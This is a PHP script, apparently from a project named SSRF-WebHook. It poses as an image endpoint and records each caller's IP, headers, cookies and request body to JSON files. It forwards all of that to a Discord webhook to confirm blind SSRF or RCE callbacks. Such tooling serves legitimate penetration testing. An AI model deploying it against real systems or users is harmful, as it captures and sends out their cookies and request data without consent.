<?php

// Default Setting
date_default_timezone_set('Asia/Tehran');
header('Content-Type: image/jpeg');
$webhookUrl = "Enter Webhook Url";

// Init Data
$data = [
    'Requester' => $_SERVER["REMOTE_ADDR"] ?? "",
    'Forwarded_For' => $_SERVER["HTTP_X_FORWARDED_FOR"] ?? "",
    'User_Agent' => $_SERVER["HTTP_USER_AGENT"] ?? "",
    'Referer_Url'=> $_SERVER["HTTP_REFERER"] ?? "",
    'QUERY_STRING' => $_SERVER["QUERY_STRING"] ?? "",
    'REMOTE_PORT' => $_SERVER["REMOTE_PORT"] ?? "",
    'REQUEST_TIME' => $_SERVER["REQUEST_TIME"] ?? "",
    'Script_Name' => $_SERVER["SCRIPT_NAME"] ?? "",
    'Cookie' => json_encode($_COOKIE) ?? "",
    'fv' => 'http://' . $_SERVER["REMOTE_ADDR"] . "/favicon.ico" ?? "",
    'Body' => json_encode($_REQUEST) ?? "",
    'dt' => date('Y-m-d\TH:i:s.000\Z'),
    'fn' => $_SERVER["REMOTE_ADDR"] . '-' . time()
];

// send message
if ($data['Requester']) {

    // Create Base Content
    $content = create_content($data);

    // Create File
    $file = create_file($content, $data['fn']);

    // send message to discord
    send_message_to_discord($data, $webhookUrl);

    // send file to discord
    send_file_to_discord($file, $webhookUrl);
}



function send_message_to_discord($data, $WebhookUrl)
{
    $ch = curl_init($WebhookUrl);

    # Setup request to send json via POST.
    $payload = json_encode([
        'content' => '',
        'embeds' => [
            0 => [
                'title' => 'SSRF or RCE Report for ' . $data['Requester'],
                'url' => 'http://' . $data['Requester'],
                'color' => 0,
                'fields' =>
                    [
                        0 => [
                            'name' => 'IP ADDRESS',
                            'value' => '```js
Forwarded-For : `' . $data['Forwarded_For'] . '`
Referrer : `' . $data['Referer_Url'] . '` ```',
                        ],
                        1 => [
                            'name' => 'USER AGENT',
                            'value' => '```js
' . $data['User_Agent'] . ' ```',
                        ],
                        2 => [
                            'name' => 'COOKIES',
                            'value' => '```js
`' . $data['Cookie'] . '` ```',
                        ],
                        3 => [
                            'name' => 'Body',
                            'value' => '```
' . $data['Body'] . ' ```',
                        ],
                        4 => [
                            'name' => 'Script Name',
                            'value' => '```
' . $data['Script_Name'] . ' ```',
                        ],
                        5 => [
                            'name' => 'FILE NAME',
                            'value' => '```
' . $data['fn'].'.json' . ' ```',
                        ],
                    ],
                'author' =>
                    [
                        'name' => $data['Requester'],
                        'url' => 'http://' . $data['Requester'],
                        'icon_url' => $data['fv'],
                    ],
                'footer' =>
                    [
                        'text' => 'Created By @Zi_Gax',
                        'icon_url' => 'https://avatars.githubusercontent.com/u/67065043?v=4',
                    ]
            ],
        ],
        'username' => 'SSRF & RCE',
        'avatar_url' => 'https://raw.githubusercontent.com/zi-gax/SSRF-WebHook/master/media/ssrf.png',
        'attachments' => [],
    ]);


    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));

    # Return response instead of printing.
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    # Send request.
    $result = curl_exec($ch);
    curl_close($ch);
}

function create_content($data)
{
    return json_encode([
        'TITLE' => 'SSRF or RCE Report for ' . $data['Requester'],
        'URL' => $data['Requester'],
        'Forwarded_For' => $data['Forwarded_For'],
        'Cookie' => $data['Cookie'],
        'Referer Url' => $data['Referer_Url'],
        'REMOTE PORT' => $data['REMOTE_PORT'],
        'QUERY STRING' => $data['QUERY_STRING'],
        'User Agent' => $data['User_Agent'],
        'REQUEST TIME' => $data['REQUEST_TIME'],
        'Body' => $data['Body'],
        'Script Name' => $data['Script_Name'],
        'FILE NAME' => $data['fn'] . '.json',
        'timestamp' => $data['dt'],
        'Created By @Zi_Gax' => 'https://avatars.githubusercontent.com/u/67065043?v=4',
    ]);
}

function create_file($content, $file_name)
{
    $file_path = __DIR__ . '/reports/' . $file_name . '.json';
    file_put_contents($file_path, $content);
    return $file_path;
}

function send_file_to_discord($file, $webhook_url)
{

// The file you want to upload
    $file_path = $file;

// Create a cURL handle
    $ch = curl_init();

// Set the cURL options
    curl_setopt($ch, CURLOPT_URL, $webhook_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Create the file upload data
    $file_data = array(
        'file' => new CURLFile($file_path)
    );

// Set the POST data for the file upload
    curl_setopt($ch, CURLOPT_POSTFIELDS, $file_data);

// Execute the cURL request
    curl_exec($ch);


// Close the cURL handle
    curl_close($ch);
}

?>